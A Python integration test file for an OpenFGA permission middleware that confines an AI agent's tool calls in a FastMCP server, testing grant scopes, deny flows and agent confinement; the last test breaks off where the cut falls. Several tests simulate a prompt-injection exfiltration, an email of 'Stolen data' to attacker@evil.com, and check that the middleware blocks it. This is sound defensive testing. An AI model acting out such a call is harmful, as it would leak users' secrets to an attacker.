#!/usr/bin/env python3
"""Integration tests for OpenFGA-backed permission middleware.

Tests the full authorization flow:
1. Session initialization writes identity tuples
2. Exempt/public tools work without grants
3. Discovery tools populate the resource registry
4. Inline elicitation grants permissions at runtime
5. Tool calls are authorized via FGA check
6. Scope isolation: once (task-only), session (cross-task), always (cross-session)
7. Deny flow
8. Intersection model: can_call requires agent_user_in_context
9. Agent confinement: write meta-tools (request_permissions, revoke_permissions) do not exist

Requires:
- OpenFGA running on localhost:8080 (in-memory)
- A store + model already created (see conftest or run setup manually)
"""

from __future__ import annotations

import json
import os
import uuid
from collections.abc import AsyncIterator
from typing import Any

import pytest
import pytest_asyncio
from fastmcp import Client, Context, FastMCP
from fastmcp.exceptions import ToolError
from openfga_sdk import ClientConfiguration, OpenFgaClient
from openfga_sdk.client.models import (
    ClientCheckRequest,
    ClientTuple,
    ClientWriteRequest,
)

from task_authz import (
    FGAConfig,
    OpenFGAPermissionMiddleware,
    ResourceType,
)
from utils import FGA_WRITE_OPTS, extract_text as _extract_text


# ---------------------------------------------------------------------------
# Config — point at the test OpenFGA instance
# ---------------------------------------------------------------------------

FGA_API_URL = os.environ.get("FGA_API_URL", "http://localhost:8080")
FGA_STORE_ID = os.environ.get("FGA_STORE_ID", "")


def _fga_config() -> FGAConfig:
    return FGAConfig(
        api_url=FGA_API_URL,
        store_id=FGA_STORE_ID,
    )


async def _direct_fga_check(
    *,
    user: str,
    relation: str,
    fga_object: str,
    contextual_tuples: list[ClientTuple] | None = None,
) -> bool:
    """Run a direct FGA check (outside the middleware)."""
    config = ClientConfiguration(api_url=FGA_API_URL, store_id=FGA_STORE_ID)
    async with OpenFgaClient(config) as fga:
        resp = await fga.check(
            ClientCheckRequest(
                user=user,
                relation=relation,
                object=fga_object,
                contextual_tuples=contextual_tuples,
            )
        )
        return resp.allowed


async def _direct_fga_write(tuples: list[ClientTuple]) -> None:
    """Write tuples directly to FGA (outside the middleware)."""
    config = ClientConfiguration(api_url=FGA_API_URL, store_id=FGA_STORE_ID)
    async with OpenFgaClient(config) as fga:
        await fga.write(ClientWriteRequest(writes=tuples), FGA_WRITE_OPTS)


# ---------------------------------------------------------------------------
# Test server factory — creates a FastMCP server with fake tools + middleware
# ---------------------------------------------------------------------------


def _create_test_server(
    user_id: str = "test_user",
) -> tuple[FastMCP, OpenFGAPermissionMiddleware]:
    """Create a FastMCP server with OpenFGA middleware and fake tools."""
    perm = OpenFGAPermissionMiddleware(
        resource_types=[
            ResourceType(
                "slack",
                "list_slack_channels",
                tool_resources={"slack_send_message": "channel_id"},
            ),
            ResourceType(
                "linear",
                "list_linear_projects",
                tool_resources={"linear_get_project": "query"},
            ),
            ResourceType("email", tool_resources={"send_email": "to"}),
        ],
        fga_config=_fga_config(),
        user_id=user_id,
    )

    mcp = FastMCP("test_openfga", middleware=[perm])
    perm.setup(mcp)

    # -- Fake tools --

    @mcp.tool(name="list_slack_channels")
    async def list_slack_channels(ctx: Context, query: str = "") -> str:
        """List Slack channels. Returns standardized [{"id": ..., "name": ...}] JSON."""
        return json.dumps(
            [
                {"id": "C5XMACTML", "name": "#general"},
                {"id": "C5W762KEU", "name": "#random"},
                {"id": "C6ABC1234", "name": "#engineering"},
            ]
        )

    @mcp.tool(name="slack_send_message")
    async def slack_send_message(ctx: Context, channel_id: str, message: str) -> str:
        """Send a message to a Slack channel."""
        return f"Message sent to {channel_id}: {message}"

    @mcp.tool(name="list_linear_projects")
    async def list_linear_projects(ctx: Context, query: str = "") -> str:
        """List Linear projects. Returns standardized [{"id": ..., "name": ...}] JSON."""
        return json.dumps(
            [
                {"id": "proj-website", "name": "Website"},
                {"id": "proj-mobile", "name": "Mobile App"},
            ]
        )

    @mcp.tool(name="linear_get_project")
    async def linear_get_project(ctx: Context, query: str) -> str:
        """Get a Linear project."""
        projects = {
            "proj-website": "Website project: redesign landing page, improve SEO.",
            "proj-mobile": "Mobile App project: React Native app for iOS and Android.",
        }
        return projects.get(query, f"Project not found: {query}")

    @mcp.tool(name="send_email")
    async def send_email(ctx: Context, to: str, subject: str, text: str) -> str:
        """Send an email message to a recipient."""
        return json.dumps({"status": "sent", "to": to, "subject": subject})

    return mcp, perm


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest_asyncio.fixture
async def server_and_client() -> AsyncIterator[
    tuple[FastMCP, OpenFGAPermissionMiddleware, Client]
]:
    """Create server with elicit mode + auto-approve client."""
    mcp, perm = _create_test_server()

    async def auto_approve(
        message: str, response_type: Any, params: Any, context: Any
    ) -> dict[str, str]:
        return {"value": "Allow for this session"}

    client = Client(mcp, elicitation_handler=auto_approve)
    await client.__aenter__()

    # Startup writes public tool tuples
    await perm.startup()

    yield mcp, perm, client

    await client.__aexit__(None, None, None)
    await perm.shutdown()


@pytest_asyncio.fixture
async def deny_server_and_client() -> AsyncIterator[
    tuple[FastMCP, OpenFGAPermissionMiddleware, Client]
]:
    """Create server + auto-deny client."""
    mcp, perm = _create_test_server()

    async def auto_deny(
        message: str, response_type: Any, params: Any, context: Any
    ) -> dict[str, str]:
        return {"value": "Do not allow"}

    client = Client(mcp, elicitation_handler=auto_deny)
    await client.__aenter__()
    await perm.startup()

    yield mcp, perm, client

    await client.__aexit__(None, None, None)
    await perm.shutdown()


@pytest_asyncio.fixture
async def once_server_and_client() -> AsyncIterator[
    tuple[FastMCP, OpenFGAPermissionMiddleware, Client]
]:
    """Create server with elicit mode + auto-approve 'once'."""
    mcp, perm = _create_test_server()

    async def approve_once(
        message: str, response_type: Any, params: Any, context: Any
    ) -> dict[str, str]:
        return {"value": "Allow once"}

    client = Client(mcp, elicitation_handler=approve_once)
    await client.__aenter__()
    await perm.startup()

    yield mcp, perm, client

    await client.__aexit__(None, None, None)
    await perm.shutdown()


@pytest_asyncio.fixture
async def always_server_and_client() -> AsyncIterator[
    tuple[FastMCP, OpenFGAPermissionMiddleware, Client]
]:
    """Create server with elicit mode + auto-approve 'always'."""
    mcp, perm = _create_test_server(user_id=f"always_user_{uuid.uuid4().hex[:8]}")

    async def approve_always(
        message: str, response_type: Any, params: Any, context: Any
    ) -> dict[str, str]:
        return {"value": "Always allow"}

    client = Client(mcp, elicitation_handler=approve_always)
    await client.__aenter__()
    await perm.startup()

    yield mcp, perm, client

    await client.__aexit__(None, None, None)
    await perm.shutdown()


# ---------------------------------------------------------------------------
# 1. Tool discovery
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_tool_discovery(server_and_client) -> None:
    """Server exposes remote tools + 2 meta-tools."""
    _, _, client = server_and_client
    tools = await client.list_tools()
    names = {t.name for t in tools}

    # Meta-tools
    assert "get_resource_metadata" in names

    # No permission management tools exposed to the agent
    assert "request_permissions" not in names, (
        "request_permissions should not be registered — agent must have no FGA write access"
    )
    assert "revoke_permissions" not in names, (
        "revoke_permissions should not be registered — agent must have no FGA write access"
    )
    assert "list_permissions" not in names, (
        "list_permissions should not be registered"
    )

    # Proxied tools
    assert "list_slack_channels" in names
    assert "slack_send_message" in names
    assert "list_linear_projects" in names
    assert "linear_get_project" in names


# ---------------------------------------------------------------------------
# 2. Exempt / public tools work without grants
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_get_resource_metadata_no_grant(server_and_client) -> None:
    """get_resource_metadata is a public tool — works without any grant."""
    _, _, client = server_and_client
    task_id = str(uuid.uuid4())
    result = await client.call_tool(
        "get_resource_metadata", {}, meta={"task_id": task_id}
    )
    text = _extract_text(result)
    data = json.loads(text)
    ns_names = [ns["name"] for ns in data]
    assert "slack" in ns_names
    assert "linear" in ns_names


@pytest.mark.asyncio
async def test_discovery_tool_requires_grant(server_and_client) -> None:
    """Discovery tools require task-scoped grants (no longer exempt)."""
    _, _, client = server_and_client
    task_id = str(uuid.uuid4())

    # Write task-scoped grants for discovery tools
    await _direct_fga_write([
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_slack_channels",
        ),
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_linear_projects",
        ),
    ])

    r1 = await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    text1 = _extract_text(r1)
    channels = json.loads(text1)
    assert len(channels) == 3
    assert channels[0]["name"] == "#general"

    r2 = await client.call_tool(
        "list_linear_projects", {"query": ""}, meta={"task_id": task_id}
    )
    text2 = _extract_text(r2)
    projects = json.loads(text2)
    assert len(projects) == 2


# ---------------------------------------------------------------------------
# 3. Discovery populates resource registry
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_discovery_populates_registry(server_and_client) -> None:
    """After calling discovery tools (with grants), the middleware registry is populated."""
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Write task-scoped grants for discovery tools
    await _direct_fga_write([
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_slack_channels",
        ),
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_linear_projects",
        ),
    ])

    # Call discovery tools
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    await client.call_tool(
        "list_linear_projects", {"query": ""}, meta={"task_id": task_id}
    )

    # Check middleware registry directly
    registry = perm._resource_registry

    assert "slack" in registry
    assert "C5XMACTML" in registry["slack"]
    assert registry["slack"]["C5XMACTML"] == "#general"

    assert "linear" in registry
    assert "proj-website" in registry["linear"]
    assert registry["linear"]["proj-website"] == "Website"


# ---------------------------------------------------------------------------
# 4. Permission denied without grant
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_denied_without_grant(deny_server_and_client) -> None:
    """User denies inline elicitation — tool call raises ToolError."""
    _, _, client = deny_server_and_client
    task_id = str(uuid.uuid4())

    with pytest.raises(ToolError, match="(?i)permission denied"):
        await client.call_tool(
            "slack_send_message",
            {"channel_id": "C5XMACTML", "message": "hello"},
            meta={"task_id": task_id},
        )


# ---------------------------------------------------------------------------
# 5. Inline elicitation + grant flow
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_tool_call_rejects_unresolved_name_with_suggestions(
    server_and_client,
) -> None:
    """Runtime tool calls fail closed when the resource cannot be resolved."""
    _, _, client = server_and_client
    task_id = str(uuid.uuid4())

    # Grant discovery tool so registry is populated
    await _direct_fga_write([
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_slack_channels",
        ),
    ])

    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )

    # "genral" is a typo that doesn't match any channel (even after normalization)
    with pytest.raises(ToolError, match="(?i)could not safely resolve"):
        await client.call_tool(
            "slack_send_message",
            {"channel_id": "genral", "message": "hello"},
            meta={"task_id": task_id},
        )


# ---------------------------------------------------------------------------
# 6. Scope isolation: once (task-only)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_once_grant_task_scoped(once_server_and_client) -> None:
    """'Once' grant (via inline elicitation) works only for the granting task."""
    _, _, client = once_server_and_client
    task_a = str(uuid.uuid4())
    task_b = str(uuid.uuid4())

    # Discover channels
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_a}
    )

    # Call with task A. Fixture auto-approves "Allow once" via inline elicitation.
    r1 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello"},
        meta={"task_id": task_a},
    )
    assert "Message sent" in _extract_text(r1)

    # Call with task B (different task). Fixture auto-approves "Allow once" again,
    # so task B gets its own task-scoped grant via inline elicitation.
    r2 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello from B"},
        meta={"task_id": task_b},
    )
    assert "Message sent" in _extract_text(r2)


# ---------------------------------------------------------------------------
# 7. Scope isolation: session (cross-task)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_session_grant_cross_task(server_and_client) -> None:
    """Session grant (via inline elicitation) works across different task_ids in the same session."""
    _, _, client = server_and_client
    task_a = str(uuid.uuid4())
    task_b = str(uuid.uuid4())

    # Discover channels
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_a}
    )

    # Call with task A. Fixture auto-approves "Allow for this session" via inline elicitation.
    await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello"},
        meta={"task_id": task_a},
    )

    # Task B (different task, same session) should work without elicitation
    # because the session grant covers both tasks.
    result = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello from B"},
        meta={"task_id": task_b},
    )
    text = _extract_text(result)
    assert "Message sent" in text


# ---------------------------------------------------------------------------
# 8. Wrong resource denied (inline elicitation writes grant, verify via _batch_check)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_wrong_resource_denied(server_and_client) -> None:
    """Grant for #general (C5XMACTML), verify #random (C5W762KEU) has no grant.

    Uses inline elicitation to write the grant (via direct tool call),
    then verifies the wrong resource is not covered by checking via the
    middleware's _batch_check (which includes agent_user_in_context).
    """
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Discover channels
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )

    # Call on #general. Fixture auto-approves via inline elicitation, middleware
    # writes session-scoped grant.
    r1 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello"},
        meta={"task_id": task_id},
    )
    assert "Message sent" in _extract_text(r1)

    # Verify #random has NO grant via middleware's _batch_check
    agent_user_id = next(iter(perm._session_info.values()))[0]
    wrong_obj = "tool_resource:slack_send_message/slack_C5W762KEU"
    check_results = await perm._batch_check(
        [(f"task:{task_id}", "can_call", wrong_obj)],
        agent_user_id,
    )
    assert check_results.get(wrong_obj) is not True, (
        "Expected #random to be denied — grant only covers #general"
    )


# ---------------------------------------------------------------------------
# 9. Multiple permissions in one request (via inline elicitation)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_multiple_permissions(server_and_client) -> None:
    """Call multiple tools directly — each triggers inline elicitation (auto-approved)."""
    _, _, client = server_and_client
    task_id = str(uuid.uuid4())

    # Discover resources
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    await client.call_tool(
        "list_linear_projects", {"query": ""}, meta={"task_id": task_id}
    )

    # Call slack_send_message — inline elicitation, auto-approved
    r1 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "update"},
        meta={"task_id": task_id},
    )
    assert "Message sent" in _extract_text(r1)

    # Call linear_get_project — inline elicitation, auto-approved
    r2 = await client.call_tool(
        "linear_get_project",
        {"query": "proj-website"},
        meta={"task_id": task_id},
    )
    assert "Website project" in _extract_text(r2)


# ---------------------------------------------------------------------------
# 10. FGA tuple verification (inline elicitation writes grant, verify via _batch_check)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_fga_tuples_written(server_and_client) -> None:
    """Verify that inline elicitation actually writes tuples to FGA.

    After calling a tool with inline elicitation (auto-approved), a second
    call to the same tool succeeds without triggering elicitation again
    (the grant is found via FGA check).
    """
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Discover + call (inline elicitation, auto-approved, grant written)
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    r1 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "first call"},
        meta={"task_id": task_id},
    )
    assert "Message sent" in _extract_text(r1)

    # Second call — should succeed without elicitation (grant already exists)
    r2 = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "second call"},
        meta={"task_id": task_id},
    )
    assert "Message sent" in _extract_text(r2)


# ---------------------------------------------------------------------------
# 11. Full "summarize website project and post to #general" flow
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_full_flow_summarize_and_post(server_and_client) -> None:
    """End-to-end: discover resources, inline elicit grants, read project, post to Slack."""
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Step 1: List namespaces (public — no grant needed)
    ns_result = await client.call_tool("get_resource_metadata", {}, meta={"task_id": task_id})
    namespaces = json.loads(_extract_text(ns_result))
    assert any(ns["name"] == "slack" for ns in namespaces)
    assert any(ns["name"] == "linear" for ns in namespaces)

    # Step 2: Write task-scoped grants for discovery tools
    await _direct_fga_write([
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_slack_channels",
        ),
        ClientTuple(
            user=f"task:{task_id}",
            relation="can_call_task",
            object="tool:list_linear_projects",
        ),
    ])

    # Step 3: Discover Slack channels
    ch_result = await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    channels = json.loads(_extract_text(ch_result))
    general = next(ch for ch in channels if ch["name"] == "#general")
    assert general["id"] == "C5XMACTML"

    # Step 4: Discover Linear projects
    proj_result = await client.call_tool(
        "list_linear_projects", {"query": ""}, meta={"task_id": task_id}
    )
    projects = json.loads(_extract_text(proj_result))
    website = next(p for p in projects if p["name"] == "Website")
    assert website["id"] == "proj-website"

    # Step 5: Verify registry is populated
    registry = perm._resource_registry
    assert registry["slack"]["C5XMACTML"] == "#general"
    assert registry["linear"]["proj-website"] == "Website"

    # Step 6: Get project details (inline elicitation, auto-approved)
    project_result = await client.call_tool(
        "linear_get_project", {"query": "proj-website"}, meta={"task_id": task_id}
    )
    project_text = _extract_text(project_result)
    assert "Website project" in project_text

    # Step 7: Post summary to #general (inline elicitation, auto-approved)
    post_result = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": f"Summary: {project_text}"},
        meta={"task_id": task_id},
    )
    post_text = _extract_text(post_result)
    assert "Message sent" in post_text
    assert "C5XMACTML" in post_text

    # Step 8: Verify a different task in the same session also works (session scope)
    task_id_2 = str(uuid.uuid4())
    r = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "follow-up"},
        meta={"task_id": task_id_2},
    )
    assert "Message sent" in _extract_text(r)


# ---------------------------------------------------------------------------
# 12. Unconfigured tool passes through
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unconfigured_tool_passes_through(server_and_client) -> None:
    """Tools not in tool_resource_map or tool_config pass through unchecked."""
    _, perm, client = server_and_client
    # get_resource_metadata is exempt, but let's verify a hypothetical unconfigured
    # tool would pass through — we can't easily add a tool at runtime, but we
    # can verify that the middleware's _build_fga_object returns None for unknown tools
    assert perm._build_fga_object("unknown_tool", {"foo": "bar"}) is None


# ---------------------------------------------------------------------------
# 13. on_initialize writes session tuples to FGA (verifies relationship chain)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_on_initialize_writes_tuples(server_and_client) -> None:
    """After session init, session_info is cached and the middleware operates correctly.

    Verifies:
    1. _session_info is populated with agent_user_id and session_id
    2. agent_user_id encodes user_id and agent identity
    3. A session grant from task A allows task B to call the tool
       (exercises the full middleware chain including FGA checks)

    Note: in the test fixture, on_initialize runs before startup() creates
    the FGA client, so identity tuples (user→agent_user, agent→agent_user)
    are not persisted to FGA. The middleware lazily writes task membership
    tuples during tool calls. This test verifies the cached state and
    end-to-end grant propagation.
    """
    _, perm, client = server_and_client

    # 1. session_info should be populated after initialize
    assert len(perm._session_info) > 0

    agent_user_id, session_id, agent_id = next(iter(perm._session_info.values()))
    assert agent_user_id, "agent_user_id should not be empty"
    assert session_id, "session_id should not be empty"

    # 2. agent_user_id should encode user_id and agent identity
    assert perm._user_id in agent_user_id, (
        f"agent_user_id should contain user_id: {agent_user_id}"
    )
    assert agent_id in agent_user_id, (
        f"agent_user_id should contain agent_id: {agent_user_id}"
    )

    # 3. Grant with task A (inline elicitation, auto-approved), call with task B.
    task_a = str(uuid.uuid4())
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_a}
    )
    result = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "from task A"},
        meta={"task_id": task_a},
    )
    assert "Message sent" in _extract_text(result)

    # Task B should succeed (middleware handles the full check flow)
    task_b = str(uuid.uuid4())
    r = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "from task B"},
        meta={"task_id": task_b},
    )
    assert "Message sent" in _extract_text(r)


# ---------------------------------------------------------------------------
# 14. Email: denied without grant (prompt injection scenario)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_send_email_denied_without_grant(deny_server_and_client) -> None:
    """send_email is blocked by the middleware when no grant exists (prompt injection scenario)."""
    _, _, client = deny_server_and_client
    task_id = str(uuid.uuid4())

    with pytest.raises(ToolError, match="(?i)permission denied"):
        await client.call_tool(
            "send_email",
            {"to": "attacker@evil.com", "subject": "Stolen data", "text": "secrets"},
            meta={"task_id": task_id},
        )


@pytest.mark.asyncio
async def test_send_email_succeeds_with_explicit_grant(server_and_client) -> None:
    """send_email works when called with inline elicitation (auto-approved)."""
    _, _, client = server_and_client
    task_id = str(uuid.uuid4())

    # Call send_email directly. Fixture auto-approves via inline elicitation.
    result = await client.call_tool(
        "send_email",
        {"to": "alice@example.com", "subject": "Hello", "text": "Hi Alice"},
        meta={"task_id": task_id},
    )
    text = _extract_text(result)
    data = json.loads(text)
    assert data["status"] == "sent"
    assert data["to"] == "alice@example.com"


@pytest.mark.asyncio
async def test_send_email_wrong_recipient_denied(server_and_client) -> None:
    """Grant for alice@example.com does not authorize sending to attacker@evil.com.

    Uses inline elicitation to write the grant (via direct tool call),
    then verifies the wrong recipient has no grant via middleware's _batch_check.
    """
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Call send_email to alice@example.com. Fixture auto-approves via inline elicitation,
    # middleware writes session-scoped grant.
    r = await client.call_tool(
        "send_email",
        {"to": "alice@example.com", "subject": "Hi", "text": "Hello"},
        meta={"task_id": task_id},
    )
    data = json.loads(_extract_text(r))
    assert data["status"] == "sent"

    # Verify attacker@evil.com has NO grant via middleware's _batch_check
    agent_user_id = next(iter(perm._session_info.values()))[0]
    wrong_obj = "tool_resource:send_email/email_attacker_evil.com"
    check_results = await perm._batch_check(
        [(f"task:{task_id}", "can_call", wrong_obj)],
        agent_user_id,
    )
    assert check_results.get(wrong_obj) is not True, (
        "Expected attacker@evil.com to be denied — grant only covers alice@example.com"
    )


# ---------------------------------------------------------------------------
# 16. Prompt injection: Slack grant does not authorize send_email
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_prompt_injection_send_email_blocked_with_slack_grant(
    server_and_client,
) -> None:
    """Simulates prompt injection: agent has Slack grant, tries send_email.

    The middleware must deny send_email even when slack_send_message is
    authorized. This tests the middleware-level enforcement that prevents
    a prompt injection from succeeding.

    Uses inline elicitation to write the Slack grant (via direct tool call),
    then verifies send_email is not covered via _batch_check.
    """
    _, perm, client = server_and_client
    task_id = str(uuid.uuid4())

    # Discover Slack channels + call (inline elicitation auto-approved)
    await client.call_tool(
        "list_slack_channels", {"query": ""}, meta={"task_id": task_id}
    )
    r = await client.call_tool(
        "slack_send_message",
        {"channel_id": "C5XMACTML", "message": "hello"},
        meta={"task_id": task_id},
    )
    assert "Message sent" in _extract_text(r)

    # Verify send_email is NOT authorized — Slack grant doesn't cover it
    agent_user_id = next(iter(perm._session_info.values()))[0]
    email_obj = "tool_resource:send_email/email_attacker_evil.com"
    check_results = await perm._batch_check(
        [(f"task:{task_id}", "can_call", email_obj)],
        agent_user_id,
    )
    assert check_results.get(email_obj) is not True, (
        "Expected send_email to be denied — Slack grant should not cover email"
    )

    # Also verify tool-level send_email is not authorized
    tool_obj = "tool:send_email"
    tool_results = await perm._batch_check(
        [(f"task:{task_id}", "can_call", tool_obj)],
        agent_user_id,
    )
    assert tool_results.get(tool_obj) is not True, (
        "Expected tool:send_email to be denied — only Slack was granted"
    )


# ---------------------------------------------------------------------------
# 17. Intersection model tests (NEW)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_intersection_denied_without_context(server_and_client) -> None:
    """Direct FGA check: grant exists but no agent_user_in_context → denied.

    Sets up the full relationship chain manually (outside middleware) to test
    the FGA model's intersection check directly.
    """
    _ = server_and_client  # ensures startup() writes public tool tuples
    task_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__agent_1"

    # Write full relationship chain + grant
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:agent_1",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}",
                relation="session",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"session:{session_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}#task",
                relation="can_call_session",
                object="tool:test_tool",
            ),
        ]
    )

    # can_call WITHOUT agent_user_in_context → denied (intersection fails)
    denied = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:test_tool",
    )
    assert denied is False, "can_call should be denied without agent_user_in_context"

    # can_call WITH agent_user_in_context → passes
    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:test_tool",
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object="tool:test_tool",
            ),
        ],
    )
    assert allowed is True, "can_call should pass with correct agent_user_in_context"


@pytest.mark.asyncio
async def test_intersection_denied_wrong_agent_user(server_and_client) -> None:
    """Direct FGA check: correct grant + wrong agent_user_in_context → denied.

    Even with the contextual tuple present, if it references the wrong
    agent_user, the intersection check must fail because the task is not
    reachable from that agent_user's membership chain.
    """
    _ = server_and_client  # ensures startup() writes public tool tuples
    task_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__agent_1"
    wrong_agent_user = f"wrong_{uuid.uuid4().hex[:8]}__agent_1"

    # Write chain for correct agent_user
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:agent_1",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}",
                relation="session",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"session:{session_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}#task",
                relation="can_call_session",
                object="tool:test_tool",
            ),
        ]
    )

    # Correct agent_user → passes
    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:test_tool",
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object="tool:test_tool",
            ),
        ],
    )
    assert allowed is True, "can_call should pass with correct agent_user"

    # Wrong agent_user → denied
    denied = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:test_tool",
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{wrong_agent_user}",
                relation="agent_user_in_context",
                object="tool:test_tool",
            ),
        ],
    )
    assert denied is False, "can_call should be denied with wrong agent_user"


@pytest.mark.asyncio
async def test_intersection_tool_resource_requires_both_tuples(
    server_and_client,
) -> None:
    """tool_resource check requires both parent_tool AND agent_user_in_context.

    Sets up the full chain manually and verifies:
    - parent_tool only → denied (missing agent_user_in_context)
    - agent_user_in_context only → denied (missing parent_tool for wildcard propagation)
    - both → passes
    """
    _ = server_and_client  # ensures startup() writes public tool tuples
    task_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__agent_1"
    tool_resource_obj = "tool_resource:slack_send_message/slack_C5XMACTML"

    # Write chain + session grant for the tool (wildcard — tool-level)
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:agent_1",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}",
                relation="session",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"session:{session_id}",
            ),
            # Tool-level grant — propagates to tool_resource via parent_tool
            ClientTuple(
                user=f"session:{session_id}#task",
                relation="can_call_session",
                object="tool:slack_send_message",
            ),
        ]
    )

    # parent_tool only (no agent_user_in_context) → denied
    denied = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object=tool_resource_obj,
        contextual_tuples=[
            ClientTuple(
                user="tool:slack_send_message",
                relation="parent_tool",
                object=tool_resource_obj,
            ),
        ],
    )
    assert denied is False, (
        "tool_resource can_call should fail without agent_user_in_context"
    )

    # Both parent_tool AND agent_user_in_context → passes
    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object=tool_resource_obj,
        contextual_tuples=[
            ClientTuple(
                user="tool:slack_send_message",
                relation="parent_tool",
                object=tool_resource_obj,
            ),
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object=tool_resource_obj,
            ),
        ],
    )
    assert allowed is True, (
        "tool_resource can_call should pass with both contextual tuples"
    )


@pytest.mark.asyncio
async def test_intersection_public_tool_requires_context(server_and_client) -> None:
    """Public tools (task:* can_call_agent_user) also require agent_user_in_context.

    The intersection model applies uniformly: even public tools need the
    contextual tuple for can_call to pass.
    """
    _ = server_and_client  # ensures startup() writes public tool tuples
    task_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__agent_1"
    public_tool = "tool:get_resource_metadata"

